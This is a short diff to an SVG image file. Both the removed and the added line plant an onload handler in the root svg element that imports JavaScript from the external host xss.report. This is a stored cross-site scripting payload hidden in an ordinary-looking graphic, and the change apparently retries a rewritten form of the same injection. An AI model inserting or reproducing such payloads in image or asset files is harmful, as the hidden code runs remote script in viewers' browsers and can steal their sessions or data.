@@ -10,7 +10,7 @@
    xmlns:xlink="http://www.w3.org/1999/xlink"
    xmlns="http://www.w3.org/2000/svg"
    xmlns:svg="http://www.w3.org/2000/svg"
-   preserveAspectRatio="xMidYMid meet" onload="(import(/https:\xss.report\c\sezzo/.source))//>">
+   preserveAspectRatio="xMidYMid meet" <svg/onload=import('//xss.report/c/sezzo')>>
   <defs
      id="defs39719">
     <linearGradient
